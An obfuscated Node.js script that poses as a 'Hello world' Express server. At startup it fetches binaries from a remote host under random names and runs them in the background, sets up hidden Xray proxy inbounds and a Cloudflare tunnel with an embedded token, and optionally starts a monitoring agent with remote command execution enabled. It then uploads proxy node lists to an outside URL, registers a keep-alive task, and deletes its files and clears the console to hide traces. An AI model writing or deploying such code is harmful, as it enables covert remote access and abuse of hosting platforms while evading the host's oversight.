const _0x50385a=_0x40ed;(function(_0x1f0b01,_0x267072){const _0x5e63b9=_0x40ed,_0x333d21=_0x1f0b01();while(!![]){try{const _0x371eba=-parseInt(_0x5e63b9(0x12f))/0x1*(-parseInt(_0x5e63b9(0x109))/0x2)+-parseInt(_0x5e63b9(0x9b))/0x3+-parseInt(_0x5e63b9(0x122))/0x4*(parseInt(_0x5e63b9(0xdb))/0x5)+-parseInt(_0x5e63b9(0xb5))/0x6*(parseInt(_0x5e63b9(0xef))/0x7)+-parseInt(_0x5e63b9(0x123))/0x8+parseInt(_0x5e63b9(0xb6))/0x9*(-parseInt(_0x5e63b9(0xa7))/0xa)+-parseInt(_0x5e63b9(0x110))/0xb*(-parseInt(_0x5e63b9(0x11e))/0xc);if(_0x371eba===_0x267072)break;else _0x333d21['push'](_0x333d21['shift']());}catch(_0x2ff961){_0x333d21['push'](_0x333d21['shift']());}}}(_0x4e0f,0xd581f));const express=require(_0x50385a(0x12e)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x50385a(0x13f)),exec=promisify(require(_0x50385a(0xad))['exec']),{execSync}=require(_0x50385a(0xad)),UPLOAD_URL=process[_0x50385a(0xa5)][_0x50385a(0x126)]||'',PROJECT_URL=process[_0x50385a(0xa5)][_0x50385a(0x148)]||'',AUTO_ACCESS=process[_0x50385a(0xa5)][_0x50385a(0x149)]||![],FILE_PATH=process[_0x50385a(0xa5)]['FILE_PATH']||_0x50385a(0x14a),SUB_PATH=process['env']['SUB_PATH']||_0x50385a(0xb1),PORT=process[_0x50385a(0xa5)][_0x50385a(0xfa)]||process['env'][_0x50385a(0xa0)]||0xbb8,UUID=process[_0x50385a(0xa5)][_0x50385a(0x12d)]||_0x50385a(0xba),NEZHA_SERVER=process[_0x50385a(0xa5)][_0x50385a(0xda)]||'',NEZHA_PORT=process['env'][_0x50385a(0x108)]||'',NEZHA_KEY=process[_0x50385a(0xa5)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x50385a(0xa5)][_0x50385a(0xd5)]||_0x50385a(0x12b),ARGO_AUTH=process['env'][_0x50385a(0x111)]||_0x50385a(0xae),ARGO_PORT=process[_0x50385a(0xa5)][_0x50385a(0x155)]||0x1f41,CFIP=process[_0x50385a(0xa5)][_0x50385a(0xd7)]||'saas.sin.fan',CFPORT=process[_0x50385a(0xa5)][_0x50385a(0x11f)]||0x1bb,NAME=process[_0x50385a(0xa5)]['NAME']||'';function _0x40ed(_0x4477b8,_0x20ed8e){_0x4477b8=_0x4477b8-0x97;const _0x4e0f32=_0x4e0f();let _0x40edca=_0x4e0f32[_0x4477b8];return _0x40edca;}!fs['existsSync'](FILE_PATH)?(fs[_0x50385a(0x9e)](FILE_PATH),console[_0x50385a(0xc6)](FILE_PATH+'\x20is\x20created')):console[_0x50385a(0xc6)](FILE_PATH+_0x50385a(0xd0));function generateRandomName(){const _0xc82470=_0x50385a,_0x4eafd7=_0xc82470(0x129);let _0x2f39e2='';for(let _0x5a35e4=0x0;_0x5a35e4<0x6;_0x5a35e4++){_0x2f39e2+=_0x4eafd7[_0xc82470(0x139)](Math['floor'](Math[_0xc82470(0xd3)]()*_0x4eafd7[_0xc82470(0xea)]));}return _0x2f39e2;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x50385a(0xd2)](FILE_PATH,phpName),webPath=path[_0x50385a(0xd2)](FILE_PATH,webName),botPath=path[_0x50385a(0xd2)](FILE_PATH,botName),subPath=path[_0x50385a(0xd2)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x50385a(0x120)),bootLogPath=path[_0x50385a(0xd2)](FILE_PATH,'boot.log'),configPath=path[_0x50385a(0xd2)](FILE_PATH,_0x50385a(0x10f));function deleteNodes(){const _0x8a9988=_0x50385a;try{if(!UPLOAD_URL)return;if(!fs[_0x8a9988(0x132)](subPath))return;let _0x2ecc2d;try{_0x2ecc2d=fs[_0x8a9988(0x118)](subPath,_0x8a9988(0xcf));}catch{return null;}const _0x4e2ba0=Buffer['from'](_0x2ecc2d,_0x8a9988(0x103))[_0x8a9988(0x11b)](_0x8a9988(0xcf)),_0x45bbe9=_0x4e2ba0[_0x8a9988(0xbb)]('\x0a')[_0x8a9988(0xd8)](_0x23d6a0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x8a9988(0xa6)](_0x23d6a0));if(_0x45bbe9[_0x8a9988(0xea)]===0x0)return;return axios[_0x8a9988(0xb3)](UPLOAD_URL+_0x8a9988(0x127),JSON[_0x8a9988(0x102)]({'nodes':_0x45bbe9}),{'headers':{'Content-Type':_0x8a9988(0x152)}})['catch'](_0x34280d=>{return null;}),null;}catch(_0x5475a3){return null;}}function cleanupOldFiles(){const _0xd1022f=_0x50385a;try{const _0x10d25b=fs[_0xd1022f(0x11a)](FILE_PATH);_0x10d25b[_0xd1022f(0xc4)](_0x5e8cdf=>{const _0xf85a03=_0xd1022f,_0x137bbe=path[_0xf85a03(0xd2)](FILE_PATH,_0x5e8cdf);try{const _0x51b3a0=fs[_0xf85a03(0xe6)](_0x137bbe);_0x51b3a0[_0xf85a03(0xe2)]()&&fs[_0xf85a03(0xaf)](_0x137bbe);}catch(_0x338b0f){}});}catch(_0x5da078){}}app[_0x50385a(0x114)]('/',function(_0xa46212,_0x420bf3){const _0x2ffb6f=_0x50385a;_0x420bf3[_0x2ffb6f(0x101)](_0x2ffb6f(0xf6));});async function generateConfig(){const _0x3a0677=_0x50385a,_0x33a9e6={'log':{'access':'/dev/null','error':_0x3a0677(0xf3),'loglevel':_0x3a0677(0xeb)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3a0677(0x106),'settings':{'clients':[{'id':UUID,'flow':_0x3a0677(0xa8)}],'decryption':_0x3a0677(0xeb),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x3a0677(0x137),'dest':0xbbb},{'path':_0x3a0677(0xf4),'dest':0xbbc}]},'streamSettings':{'network':_0x3a0677(0x10e)}},{'port':0xbb9,'listen':_0x3a0677(0x145),'protocol':_0x3a0677(0x106),'settings':{'clients':[{'id':UUID}],'decryption':_0x3a0677(0xeb)},'streamSettings':{'network':_0x3a0677(0x10e),'security':_0x3a0677(0xeb)}},{'port':0xbba,'listen':_0x3a0677(0x145),'protocol':_0x3a0677(0x106),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3a0677(0xeb)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3a0677(0xb7)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3a0677(0xa2),_0x3a0677(0x121)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3a0677(0x145),'protocol':_0x3a0677(0xaa),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3a0677(0x137)}},'sniffing':{'enabled':!![],'destOverride':[_0x3a0677(0xe7),_0x3a0677(0xa2),_0x3a0677(0x121)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3a0677(0x145),'protocol':_0x3a0677(0x107),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3a0677(0xeb),'wsSettings':{'path':_0x3a0677(0xf4)}},'sniffing':{'enabled':!![],'destOverride':[_0x3a0677(0xe7),'tls',_0x3a0677(0x121)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x3a0677(0xf8),'tag':_0x3a0677(0x12c)},{'protocol':_0x3a0677(0xd4),'tag':_0x3a0677(0xd1)}]};fs[_0x3a0677(0x134)](path[_0x3a0677(0xd2)](FILE_PATH,'config.json'),JSON['stringify'](_0x33a9e6,null,0x2));}function getSystemArchitecture(){const _0xfce00c=_0x50385a,_0x2437db=os[_0xfce00c(0x11d)]();return _0x2437db===_0xfce00c(0xb0)||_0x2437db===_0xfce00c(0x112)||_0x2437db===_0xfce00c(0x100)?'arm':_0xfce00c(0x10d);}function downloadFile(_0x2f5739,_0x5d195a,_0x1ce08b){const _0x47ecf8=_0x50385a,_0x328095=_0x2f5739;!fs['existsSync'](FILE_PATH)&&fs[_0x47ecf8(0x9e)](FILE_PATH,{'recursive':!![]});const _0x20c4ca=fs[_0x47ecf8(0xee)](_0x328095);axios({'method':_0x47ecf8(0x114),'url':_0x5d195a,'responseType':_0x47ecf8(0x131)})[_0x47ecf8(0x117)](_0x521f79=>{const _0x2136f4=_0x47ecf8;_0x521f79[_0x2136f4(0x14f)][_0x2136f4(0x140)](_0x20c4ca),_0x20c4ca['on'](_0x2136f4(0x146),()=>{const _0xc7030a=_0x2136f4;_0x20c4ca['close'](),console[_0xc7030a(0xc6)](_0xc7030a(0xed)+path['basename'](_0x328095)+'\x20successfully'),_0x1ce08b(null,_0x328095);}),_0x20c4ca['on']('error',_0x435189=>{const _0x4b9375=_0x2136f4;fs['unlink'](_0x328095,()=>{});const _0x284682='Download\x20'+path[_0x4b9375(0xb8)](_0x328095)+_0x4b9375(0xa3)+_0x435189[_0x4b9375(0xc5)];console[_0x4b9375(0x142)](_0x284682),_0x1ce08b(_0x284682);});})['catch'](_0x1d200c=>{const _0x55fc8d=_0x47ecf8,_0x345358=_0x55fc8d(0xed)+path[_0x55fc8d(0xb8)](_0x328095)+_0x55fc8d(0xa3)+_0x1d200c['message'];console[_0x55fc8d(0x142)](_0x345358),_0x1ce08b(_0x345358);});}function _0x4e0f(){const _0x35e78d=['\x0a\x20\x20\x0avmess://','\x0a\x20\x20\x20\x20','aarch64','send','stringify','base64','win32','response','vless','trojan','NEZHA_PORT','14UyNDrB','&path=%2Ftrojan-argo%3Fed%3D2560#','https://amd64.ssss.nyc.mn/bot','catch','amd','tcp','config.json','3487SHbwMK','ARGO_AUTH','arm64','config.yaml','get','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20is\x20running','then','readFileSync','https://oooo.serv00.net/add-url','readdirSync','toString','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','arch','148692cAuaPf','CFPORT','list.txt','quic','2564BjjsWO','7562200ihKBEq','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/sub.txt\x20saved\x20successfully','UPLOAD_URL','/api/delete-nodes','App\x20is\x20running','abcdefghijklmnopqrstuvwxyz','tunnel.yml','clawrunsg.xiangyu-group.com.cn','direct','UUID','express','19732dzQQKd','automatic\x20access\x20task\x20added\x20successfully','stream','existsSync','false','writeFileSync','TunnelSecret','\x20>/dev/null\x202>&1\x20&','/vmess-argo','Error\x20in\x20startserver:','charAt','https://arm64.ssss.nyc.mn/v1','del\x20/f\x20/q\x20','\x22\x20>\x20/dev/null\x202>&1','ARGO_DOMAIN:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','util','pipe','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','error','&fp=firefox&type=ws&host=','push','127.0.0.1','finish','\x20-p\x20','PROJECT_URL','AUTO_ACCESS','./tmp','from','platform','https://arm64.ssss.nyc.mn/bot','Error\x20reading\x20boot.log:','data','fileName','npm\x20running\x20error:\x20','application/json','/api/add-nodes','https://amd64.ssss.nyc.mn/agent','ARGO_PORT','/api/add-subscriptions','trim','pop','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','status','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','unshift','2092113ncmDGV','2083','pkill\x20-f\x20\x22[','mkdirSync','8443','PORT','443','tls','\x20failed:\x20','Unhandled\x20error\x20in\x20startserver:','env','test','1430uwbaHK','xtls-rprx-vision','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','vmess','Nodes\x20uploaded\x20successfully','\x20-c\x20\x22','child_process','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiMzBhNDU5OGQtYzU1NC00MGZmLThiMDEtODc3YTg1NTVhZWI1IiwicyI6Ik5tSmlObVl3T0RFdE16WXpPQzAwTm1VekxXSTROR1F0TUROak5tRXhNREkxWkRNMyJ9','unlinkSync','arm','sub','https://arm64.ssss.nyc.mn/agent','post','Empowerment\x20failed\x20for\x20','6fSqpLw','17685hhqQlk','/vless-argo','basename','Error\x20downloading\x20files:','bc97f674-c578-4940-9234-0a1da46041b9','split','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x20\x20credentials-file:\x20','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20\x0atrojan://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','match','nohup\x20','forEach','message','log','/tunnel.yml\x20run','\x0a\x20\x20tunnel:\x20','includes','2053','/config.json\x20>/dev/null\x202>&1\x20&','ArgoDomain:','tunnel.json','2096','utf-8','\x20already\x20exists','block','join','random','blackhole','ARGO_DOMAIN','Skipping\x20adding\x20automatic\x20access\x20task','CFIP','filter','clear','NEZHA_SERVER','6710jGliAJ','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','all','\x20-c\x20','substring','--tls','?security=tls&sni=','isFile','php\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/v1','chmod','statSync','http','?encryption=none&security=tls&sni=','text/plain;\x20charset=utf-8','length','none','2087','Download\x20','createWriteStream','2853767oTthwb','has','\x20>\x20nul\x202>&1','Error\x20executing\x20command:\x20','/dev/null','/trojan-argo','NEZHA\x20variable\x20is\x20empty,skip\x20running','Hello\x20world!','fileUrl','freedom','boot.log','SERVER_PORT','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','web\x20running\x20error:\x20','Content-Type'];_0x4e0f=function(){return _0x35e78d;};return _0x4e0f();}async function downloadFilesAndRun(){const _0x21a1f4=_0x50385a,_0x9eb19e=getSystemArchitecture(),_0x2a3f4b=getFilesForArchitecture(_0x9eb19e);if(_0x2a3f4b[_0x21a1f4(0xea)]===0x0){console[_0x21a1f4(0xc6)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0xfcafe5=_0x2a3f4b['map'](_0x3fa9c8=>{return new Promise((_0xee03eb,_0x132513)=>{const _0xa21642=_0x40ed;downloadFile(_0x3fa9c8[_0xa21642(0x150)],_0x3fa9c8[_0xa21642(0xf7)],(_0x3ad325,_0xd1df78)=>{_0x3ad325?_0x132513(_0x3ad325):_0xee03eb(_0xd1df78);});});});try{await Promise[_0x21a1f4(0xdd)](_0xfcafe5);}catch(_0x157cc6){console[_0x21a1f4(0x142)](_0x21a1f4(0xb9),_0x157cc6);return;}function _0x32e4c1(_0x50fe76){const _0x3077d9=_0x21a1f4,_0x5e6ace=0x1fd;_0x50fe76[_0x3077d9(0xc4)](_0x988e74=>{const _0x3344b5=_0x3077d9;fs[_0x3344b5(0x132)](_0x988e74)&&fs[_0x3344b5(0xe5)](_0x988e74,_0x5e6ace,_0x26c727=>{const _0x341853=_0x3344b5;_0x26c727?console[_0x341853(0x142)](_0x341853(0xb4)+_0x988e74+':\x20'+_0x26c727):console['log']('Empowerment\x20success\x20for\x20'+_0x988e74+':\x20'+_0x5e6ace['toString'](0x8));});});}const _0x157cf3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x32e4c1(_0x157cf3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4f6bf7=NEZHA_SERVER[_0x21a1f4(0xc9)](':')?NEZHA_SERVER[_0x21a1f4(0xbb)](':')[_0x21a1f4(0x158)]():'',_0x36429a=new Set(['443','8443','2096',_0x21a1f4(0xec),_0x21a1f4(0x9c),_0x21a1f4(0xca)]),_0x25fc2f=_0x36429a[_0x21a1f4(0xf0)](_0x4f6bf7)?'true':_0x21a1f4(0x133),_0x5d53c4='\x0aclient_secret:\x20'+NEZHA_KEY+_0x21a1f4(0xfb)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x25fc2f+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x21a1f4(0x134)](path[_0x21a1f4(0xd2)](FILE_PATH,_0x21a1f4(0x113)),_0x5d53c4);const _0x3dc5f7=_0x21a1f4(0xc3)+phpPath+_0x21a1f4(0xac)+FILE_PATH+_0x21a1f4(0xa9);try{await exec(_0x3dc5f7),console['log'](phpName+_0x21a1f4(0x116)),await new Promise(_0xf4bebf=>setTimeout(_0xf4bebf,0x3e8));}catch(_0x3c1e29){console[_0x21a1f4(0x142)](_0x21a1f4(0xe3)+_0x3c1e29);}}else{let _0x55fe93='';const _0x30138a=[_0x21a1f4(0xa1),_0x21a1f4(0x9f),_0x21a1f4(0xce),_0x21a1f4(0xec),_0x21a1f4(0x9c),_0x21a1f4(0xca)];_0x30138a[_0x21a1f4(0xc9)](NEZHA_PORT)&&(_0x55fe93=_0x21a1f4(0xe0));const _0x48cc9e=_0x21a1f4(0xc3)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x21a1f4(0x147)+NEZHA_KEY+'\x20'+_0x55fe93+_0x21a1f4(0xc1);try{await exec(_0x48cc9e),console[_0x21a1f4(0xc6)](npmName+_0x21a1f4(0x116)),await new Promise(_0x50f7fd=>setTimeout(_0x50f7fd,0x3e8));}catch(_0x868e8e){console[_0x21a1f4(0x142)](_0x21a1f4(0x151)+_0x868e8e);}}}else console[_0x21a1f4(0xc6)](_0x21a1f4(0xf5));const _0x2d79f8='nohup\x20'+webPath+_0x21a1f4(0xde)+FILE_PATH+_0x21a1f4(0xcb);try{await exec(_0x2d79f8),console['log'](webName+_0x21a1f4(0x116)),await new Promise(_0x1e47c3=>setTimeout(_0x1e47c3,0x3e8));}catch(_0xf068af){console['error'](_0x21a1f4(0xfc)+_0xf068af);}if(fs[_0x21a1f4(0x132)](botPath)){let _0x3f95bd;if(ARGO_AUTH[_0x21a1f4(0xc2)](/^[A-Z0-9a-z=]{120,250}$/))_0x3f95bd=_0x21a1f4(0xbc)+ARGO_AUTH;else ARGO_AUTH[_0x21a1f4(0xc2)](/TunnelSecret/)?_0x3f95bd=_0x21a1f4(0x11c)+FILE_PATH+_0x21a1f4(0xc7):_0x3f95bd=_0x21a1f4(0xdc)+FILE_PATH+_0x21a1f4(0x124)+ARGO_PORT;try{await exec(_0x21a1f4(0xc3)+botPath+'\x20'+_0x3f95bd+_0x21a1f4(0x136)),console[_0x21a1f4(0xc6)](botName+_0x21a1f4(0x116)),await new Promise(_0x46d4eb=>setTimeout(_0x46d4eb,0x7d0));}catch(_0x111ba8){console[_0x21a1f4(0x142)](_0x21a1f4(0xf2)+_0x111ba8);}}await new Promise(_0xfceca9=>setTimeout(_0xfceca9,0x1388));}function getFilesForArchitecture(_0x43f74d){const _0x3d20b8=_0x50385a;let _0x171233;_0x43f74d===_0x3d20b8(0xb0)?_0x171233=[{'fileName':webPath,'fileUrl':_0x3d20b8(0xbf)},{'fileName':botPath,'fileUrl':_0x3d20b8(0x14d)}]:_0x171233=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3d20b8(0x10b)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4fcdf2=_0x43f74d===_0x3d20b8(0xb0)?_0x3d20b8(0xb2):_0x3d20b8(0x154);_0x171233[_0x3d20b8(0x9a)]({'fileName':npmPath,'fileUrl':_0x4fcdf2});}else{const _0x1273ab=_0x43f74d===_0x3d20b8(0xb0)?_0x3d20b8(0x13a):_0x3d20b8(0xe4);_0x171233[_0x3d20b8(0x9a)]({'fileName':phpPath,'fileUrl':_0x1273ab});}}return _0x171233;}function argoType(){const _0x1d28b7=_0x50385a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1d28b7(0xc6)](_0x1d28b7(0x99));return;}if(ARGO_AUTH[_0x1d28b7(0xc9)](_0x1d28b7(0x135))){fs[_0x1d28b7(0x134)](path[_0x1d28b7(0xd2)](FILE_PATH,_0x1d28b7(0xcd)),ARGO_AUTH);const _0x15a085=_0x1d28b7(0xc8)+ARGO_AUTH[_0x1d28b7(0xbb)]('\x22')[0xb]+_0x1d28b7(0xbe)+path[_0x1d28b7(0xd2)](FILE_PATH,_0x1d28b7(0xcd))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x1d28b7(0x97)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,_0x1d28b7(0x12a)),_0x15a085);}else console[_0x1d28b7(0xc6)](_0x1d28b7(0xbd));}argoType();async function extractDomains(){const _0x10a10a=_0x50385a;let _0x5d7eb5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5d7eb5=ARGO_DOMAIN,console[_0x10a10a(0xc6)](_0x10a10a(0x13d),_0x5d7eb5),await _0x31035f(_0x5d7eb5);else try{const _0x135409=fs[_0x10a10a(0x118)](path[_0x10a10a(0xd2)](FILE_PATH,'boot.log'),_0x10a10a(0xcf)),_0x127af9=_0x135409['split']('\x0a'),_0x25dcc7=[];_0x127af9[_0x10a10a(0xc4)](_0x41a7e1=>{const _0x105f4f=_0x10a10a,_0xdeba38=_0x41a7e1[_0x105f4f(0xc2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xdeba38){const _0x3e636b=_0xdeba38[0x1];_0x25dcc7[_0x105f4f(0x144)](_0x3e636b);}});if(_0x25dcc7[_0x10a10a(0xea)]>0x0)_0x5d7eb5=_0x25dcc7[0x0],console[_0x10a10a(0xc6)](_0x10a10a(0xcc),_0x5d7eb5),await _0x31035f(_0x5d7eb5);else{console[_0x10a10a(0xc6)](_0x10a10a(0x13e)),fs[_0x10a10a(0xaf)](path['join'](FILE_PATH,_0x10a10a(0xf9)));async function _0x7309f7(){const _0x242352=_0x10a10a;try{process[_0x242352(0x14c)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x242352(0x9d)+botName[_0x242352(0x139)](0x0)+']'+botName[_0x242352(0xdf)](0x1)+_0x242352(0x13c));}catch(_0x14404d){}}_0x7309f7(),await new Promise(_0x20b8c4=>setTimeout(_0x20b8c4,0xbb8));const _0x1755f6=_0x10a10a(0xdc)+FILE_PATH+_0x10a10a(0x124)+ARGO_PORT;try{await exec(_0x10a10a(0xc3)+botPath+'\x20'+_0x1755f6+'\x20>/dev/null\x202>&1\x20&'),console[_0x10a10a(0xc6)](botName+_0x10a10a(0x116)),await new Promise(_0x23a8df=>setTimeout(_0x23a8df,0xbb8)),await extractDomains();}catch(_0x44c938){console[_0x10a10a(0x142)](_0x10a10a(0xf2)+_0x44c938);}}}catch(_0xc93b46){console['error'](_0x10a10a(0x14e),_0xc93b46);}async function _0x31035f(_0x30f421){const _0x457987=_0x10a10a,_0x42971f=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x457987(0xcf)}),_0xe9b861=_0x42971f[_0x457987(0x157)](),_0x2777a5=NAME?NAME+'-'+_0xe9b861:_0xe9b861;return new Promise(_0x2e596c=>{setTimeout(()=>{const _0x1a0400=_0x40ed,_0x20b406={'v':'2','ps':''+_0x2777a5,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1a0400(0xeb),'net':'ws','type':_0x1a0400(0xeb),'host':_0x30f421,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x30f421,'alpn':'','fp':'firefox'},_0x3dd9d5='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1a0400(0xe8)+_0x30f421+'&fp=firefox&type=ws&host='+_0x30f421+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2777a5+_0x1a0400(0xfe)+Buffer['from'](JSON[_0x1a0400(0x102)](_0x20b406))[_0x1a0400(0x11b)](_0x1a0400(0x103))+_0x1a0400(0xc0)+UUID+'@'+CFIP+':'+CFPORT+_0x1a0400(0xe1)+_0x30f421+_0x1a0400(0x143)+_0x30f421+_0x1a0400(0x10a)+_0x2777a5+_0x1a0400(0xff);console['log'](Buffer['from'](_0x3dd9d5)[_0x1a0400(0x11b)](_0x1a0400(0x103))),fs[_0x1a0400(0x134)](subPath,Buffer[_0x1a0400(0x14b)](_0x3dd9d5)[_0x1a0400(0x11b)]('base64')),console[_0x1a0400(0xc6)](FILE_PATH+_0x1a0400(0x125)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x47fe4b,_0xedf75c)=>{const _0x303d44=_0x1a0400,_0x3cc9d3=Buffer[_0x303d44(0x14b)](_0x3dd9d5)[_0x303d44(0x11b)]('base64');_0xedf75c['set'](_0x303d44(0xfd),_0x303d44(0xe9)),_0xedf75c[_0x303d44(0x101)](_0x3cc9d3);}),_0x2e596c(_0x3dd9d5);},0x7d0);});}}async function uploadNodes(){const _0x47d278=_0x50385a;if(UPLOAD_URL&&PROJECT_URL){const _0x18c646=PROJECT_URL+'/'+SUB_PATH,_0x350ee1={'subscription':[_0x18c646]};try{const _0xc72106=await axios[_0x47d278(0xb3)](UPLOAD_URL+_0x47d278(0x156),_0x350ee1,{'headers':{'Content-Type':'application/json'}});return _0xc72106&&_0xc72106[_0x47d278(0x98)]===0xc8?(console[_0x47d278(0xc6)]('Subscription\x20uploaded\x20successfully'),_0xc72106):null;}catch(_0x5942d9){if(_0x5942d9['response']){if(_0x5942d9[_0x47d278(0x105)][_0x47d278(0x98)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x2190ff=fs[_0x47d278(0x118)](listPath,_0x47d278(0xcf)),_0x4f595b=_0x2190ff[_0x47d278(0xbb)]('\x0a')[_0x47d278(0xd8)](_0x4ac7dd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x47d278(0xa6)](_0x4ac7dd));if(_0x4f595b[_0x47d278(0xea)]===0x0)return;const _0x5e553a=JSON[_0x47d278(0x102)]({'nodes':_0x4f595b});try{const _0x3aa221=await axios[_0x47d278(0xb3)](UPLOAD_URL+_0x47d278(0x153),_0x5e553a,{'headers':{'Content-Type':'application/json'}});return _0x3aa221&&_0x3aa221['status']===0xc8?(console[_0x47d278(0xc6)](_0x47d278(0xab)),_0x3aa221):null;}catch(_0x3b1f53){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2e3482=_0x40ed,_0x23ba12=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x23ba12[_0x2e3482(0x144)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x23ba12[_0x2e3482(0x144)](phpPath);process[_0x2e3482(0x14c)]===_0x2e3482(0x104)?exec(_0x2e3482(0x13b)+_0x23ba12['join']('\x20')+_0x2e3482(0xf1),_0x166ff4=>{const _0x5dba4b=_0x2e3482;console[_0x5dba4b(0xd9)](),console[_0x5dba4b(0xc6)](_0x5dba4b(0x128)),console['log'](_0x5dba4b(0x141));}):exec('rm\x20-rf\x20'+_0x23ba12[_0x2e3482(0xd2)]('\x20')+'\x20>/dev/null\x202>&1',_0x372bcc=>{const _0x1b0495=_0x2e3482;console['clear'](),console[_0x1b0495(0xc6)](_0x1b0495(0x128)),console[_0x1b0495(0xc6)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5af808=_0x50385a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5af808(0xc6)](_0x5af808(0xd6));return;}try{const _0x3cd022=await axios[_0x5af808(0xb3)](_0x5af808(0x119),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5af808(0x152)}});return console['log'](_0x5af808(0x130)),_0x3cd022;}catch(_0x425ba7){return console['error'](_0x5af808(0x115)+_0x425ba7[_0x5af808(0xc5)]),null;}}async function startserver(){const _0x15d3ea=_0x50385a;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1d3cb5){console[_0x15d3ea(0x142)](_0x15d3ea(0x138),_0x1d3cb5);}}startserver()[_0x50385a(0x10c)](_0x5868a0=>{const _0x4de972=_0x50385a;console[_0x4de972(0x142)](_0x4de972(0xa4),_0x5868a0);}),app['listen'](PORT,()=>console[_0x50385a(0xc6)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
